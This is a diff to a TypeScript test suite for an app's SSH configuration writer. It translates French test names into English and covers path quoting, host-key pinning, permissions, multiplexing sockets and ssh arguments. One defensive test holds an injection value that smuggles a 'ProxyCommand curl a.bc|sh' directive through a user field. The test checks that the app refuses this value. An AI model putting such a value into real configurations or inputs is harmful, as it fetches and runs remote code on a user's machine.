@@ -60,8 +60,8 @@ const SYSTEM_SERVER: Server = {
   user: "",
 };
 
-describe("le fichier de configuration de l'app", () => {
-  it("décrit chaque serveur ajouté par l'app", () => {
+describe("the app's configuration file", () => {
+  it("describes each server added by the app", () => {
     const paths = appSshPaths("/data");
 
     const config = renderSshConfig([APP_SERVER], paths);
@@ -75,7 +75,7 @@ describe("le fichier de configuration de l'app", () => {
     expect(config).toContain(`  UserKnownHostsFile ${paths.knownHostsPath}`);
   });
 
-  it("laisse un hôte du système hors du fichier, puisque l'app n'écrit rien pour lui", () => {
+  it("leaves a system host out of the file, since the app writes nothing for it", () => {
     const config = renderSshConfig(
       [APP_SERVER, SYSTEM_SERVER],
       appSshPaths("/data")
@@ -85,7 +85,7 @@ describe("le fichier de configuration de l'app", () => {
     expect(config).toContain("pupitre-srv-a");
   });
 
-  it("garde l'identifiant seul quand le nom est celui d'un hôte du système", () => {
+  it("keeps the id alone when the name is that of a system host", () => {
     const config = renderSshConfig(
       [APP_SERVER],
       appSshPaths("/data"),
@@ -98,7 +98,7 @@ describe("le fichier de configuration de l'app", () => {
     expect(config).not.toContain("staging");
   });
 
-  it("accepte la clé d'hôte au premier contact, l'exige une fois épinglée", () => {
+  it("accepts the host key on first contact, requires it once pinned", () => {
     const paths = appSshPaths("/data");
 
     const first = renderSshConfig([APP_SERVER], paths);
@@ -112,7 +112,7 @@ describe("le fichier de configuration de l'app", () => {
     expect(pinned).not.toContain("accept-new");
   });
 
-  it("s'écrit en 0600 dans un dossier 0700, et pose le lien", () => {
+  it("is written as 0600 in a 0700 folder, and creates the link", () => {
     const paths = pathsIn(userData());
 
     writeSshConfig([APP_SERVER], paths);
@@ -126,7 +126,7 @@ describe("le fichier de configuration de l'app", () => {
   });
 });
 
-describe("une valeur qui ajouterait une directive au fichier", () => {
+describe("a value that would add a directive to the file", () => {
   const INJECTION = "x\nProxyCommand curl a.bc|sh";
 
   const OTHER: Server = {
@@ -136,7 +136,7 @@ describe("une valeur qui ajouterait une directive au fichier", () => {
     slug: "other",
   };
 
-  it("n'écrit aucun bloc pour le serveur qui la porte, et garde les autres", () => {
+  it("writes no block for the server that carries it, and keeps the others", () => {
     for (const unfit of [
       { ...APP_SERVER, user: INJECTION },
       { ...APP_SERVER, user: "root\tProxyCommand" },
@@ -158,15 +158,15 @@ describe("une valeur qui ajouterait une directive au fichier", () => {
     }
   });
 
-  it("n'écrit rien pour un fichier connu dont le chemin porte un retour à la ligne", () => {
+  it("writes nothing for a known file whose path contains a newline", () => {
     const paths = appSshPaths(`/data/${INJECTION}`);
 
     expect(renderSshConfig([APP_SERVER], paths)).not.toContain("ProxyCommand");
   });
 });
 
-describe("le lien sans espace vers le dossier de l'app", () => {
-  it("se pose dans ~/.pupitre, fermé aux autres, et pointe sur le dossier", () => {
+describe("the space-free link to the app folder", () => {
+  it("is created in ~/.pupitre, closed to others, and points at the folder", () => {
     const paths = pathsIn(userData());
 
     expect(ensureLink(paths)).toBe(paths.link);
@@ -175,7 +175,7 @@ describe("le lien sans espace vers le dossier de l'app", () => {
     expect(ensureLink(paths)).toBe(paths.link);
   });
 
-  it("reprend un lien qui pointait sur un dossier parti", () => {
+  it("takes over a link that pointed at a folder that is gone", () => {
     const paths = pathsIn(userData());
     const gone = join(dirname(paths.root), "gone");
 
@@ -186,7 +186,7 @@ describe("le lien sans espace vers le dossier de l'app", () => {
     expect(realpathSync(paths.link)).toBe(realpathSync(paths.root));
   });
 
-  it("laisse en place ce qui n'est pas un lien, et rend alors les chemins réels", () => {
+  it("leaves in place what is not a link, and then returns the real paths", () => {
     const paths = pathsIn(userData());
 
     mkdirSync(paths.link, { recursive: true });
@@ -203,8 +203,8 @@ describe("le lien sans espace vers le dossier de l'app", () => {
   });
 });
 
-describe("les chemins que chaque système impose", () => {
-  it("cite un chemin qui porte un espace, sinon ssh refuse tout le fichier", () => {
+describe("the paths each system imposes", () => {
+  it("quotes a path containing a space, otherwise ssh refuses the whole file", () => {
     const paths = appSshPaths(
       "/Users/jean/Library/Application Support/Pupitre"
     );
@@ -226,14 +226,14 @@ describe("les chemins que chaque système impose", () => {
     expect(config).toContain(`  UserKnownHostsFile "${paths.knownHostsPath}"`);
   });
 
-  it("laisse nu un chemin sans espace", () => {
+  it("leaves a path without a space bare", () => {
     const config = renderSshConfig([APP_SERVER], appSshPaths("/data"), "linux");
 
     expect(config).toContain("  IdentityFile /data/keys/srv-a");
     expect(config).not.toContain('"');
   });
 
-  it("nomme la clé et les hôtes connus à travers le lien quand il tient, puisque Gateway coupe sur l'espace", () => {
+  it("names the key and known hosts through the link when it holds, since Gateway splits on the space", () => {
     const paths = appSshPaths(
       "/Users/jean/Library/Application Support/Pupitre Dev (app.pupitre.studio)",
       "/Users/jean"
@@ -260,7 +260,7 @@ describe("les chemins que chaque système impose", () => {
     expect(config).not.toContain('"');
   });
 
-  it("garde son chemin à une clé qui vit hors du dossier de l'app", () => {
+  it("keeps its path for a key that lives outside the app folder", () => {
     const paths = appSshPaths("/data", "/home/jean");
 
     const config = renderSshConfig(
@@ -278,7 +278,7 @@ describe("les chemins que chaque système impose", () => {
     );
   });
 
-  it("n'écrit aucun ControlMaster pour Windows, dont l'OpenSSH l'ignore", () => {
+  it("writes no ControlMaster for Windows, whose OpenSSH ignores it", () => {
     const windows = renderSshConfig(
       [
         {
@@ -300,7 +300,7 @@ describe("les chemins que chaque système impose", () => {
     );
   });
 
-  it("le garde sur macOS et sur Linux", () => {
+  it("keeps it on macOS and Linux", () => {
     const paths = appSshPaths("/data");
 
     for (const platform of ["darwin", "linux"] as const) {
@@ -312,8 +312,8 @@ describe("les chemins que chaque système impose", () => {
   });
 });
 
-describe("le chemin de multiplexage", () => {
-  it("tient dans la limite d'un socket Unix, nom temporaire de ssh compris", () => {
+describe("the multiplexing path", () => {
+  it("fits within the limit of a Unix socket, ssh's temporary name included", () => {
     const dir = controlDir(501);
 
     expect(controlPath(dir)).toBe("/tmp/pupitre-501/%C");
@@ -323,11 +323,11 @@ describe("le chemin de multiplexage", () => {
     );
   });
 
-  it("donne à chaque compte de la machine un dossier qui lui est propre", () => {
+  it("gives each account on the machine a folder of its own", () => {
     expect(controlDir(501)).not.toBe(controlDir(502));
   });
 
-  it("crée le dossier fermé aux autres, et le referme s'il s'était ouvert", () => {
+  it("creates the folder closed to others, and closes it again if it had opened", () => {
     const base = mkdtempSync(join(tmpdir(), "pupitre-control-"));
     const dir = controlDir(process.getuid?.() ?? 0, base);
 
@@ -343,7 +343,7 @@ describe("le chemin de multiplexage", () => {
     }
   });
 
-  it("refuse un lien, un fichier, ou le dossier d'un autre compte", () => {
+  it("refuses a link, a file, or another account's folder", () => {
     const base = mkdtempSync(join(tmpdir(), "pupitre-control-"));
     const uid = process.getuid?.() ?? 0;
 
@@ -364,7 +364,7 @@ describe("le chemin de multiplexage", () => {
     }
   });
 
-  it("laisse la connexion sans maître quand aucun dossier ne peut être le sien", () => {
+  it("leaves the connection without a master when no folder can be its own", () => {
     const paths = appSshPaths("/data");
     const config = renderSshConfig([APP_SERVER], paths, "darwin", null);
 
@@ -372,7 +372,7 @@ describe("le chemin de multiplexage", () => {
     expect(config).not.toContain("ControlPath");
   });
 
-  it("nomme le socket par ce que ssh sait du serveur et du compte", () => {
+  it("names the socket after what ssh knows of the server and the account", () => {
     const paths = appSshPaths("/data");
     const config = renderSshConfig(
       [APP_SERVER],
@@ -385,8 +385,8 @@ describe("le chemin de multiplexage", () => {
   });
 });
 
-describe("les arguments d'un appel ssh", () => {
-  it("passe le fichier de l'app pour un serveur de l'app", () => {
+describe("the arguments of an ssh call", () => {
+  it("passes the app's file for an app server", () => {
     const paths = appSshPaths("/data");
 
     expect(sshArgs(APP_SERVER, paths)).toEqual([
@@ -396,18 +396,18 @@ describe("les arguments d'un appel ssh", () => {
     ]);
   });
 
-  it("laisse un hôte du système à la configuration du système", () => {
+  it("leaves a system host to the system configuration", () => {
     expect(sshArgs(SYSTEM_SERVER, appSshPaths("/data"))).toEqual(["dev-vps"]);
   });
 
-  it("nomme un serveur de l'app par son identifiant, jamais par son adresse", () => {
+  it("names an app server by its id, never by its address", () => {
     expect(alias(APP_SERVER)).toBe("pupitre-srv-a");
     expect(alias(SYSTEM_SERVER)).toBe("dev-vps");
   });
 });
 
-describe("la clé de known_hosts", () => {
-  it("est l'hôte seul sur le port par défaut, entre crochets ailleurs", () => {
+describe("the known_hosts key", () => {
+  it("is the bare host on the default port, in brackets elsewhere", () => {
     expect(knownHostsKey(APP_SERVER)).toBe("203.0.113.10");
     expect(knownHostsKey({ ...APP_SERVER, port: 2222 })).toBe(
       "[203.0.113.10]:2222"
@@ -415,8 +415,8 @@ describe("la clé de known_hosts", () => {
   });
 });
 
-describe("les hôtes déclarés par le système", () => {
-  it("lit les blocs Host et écarte les motifs", () => {
+describe("the hosts declared by the system", () => {
+  it("reads Host blocks and drops patterns", () => {
     const home = mkdtempSync(join(tmpdir(), "pupitre-home-"));
     const file = join(home, "config");
     writeFileSync(
@@ -430,7 +430,7 @@ describe("les hôtes déclarés par le système", () => {
     expect(hosts).toEqual(["dev-vps", "prod", "bastion"]);
   });
 
-  it("renvoie une liste vide quand le fichier n'existe pas", () => {
+  it("returns an empty list when the file does not exist", () => {
     expect(readSystemHosts("/nowhere/ssh/config")).toEqual([]);
   });
 });
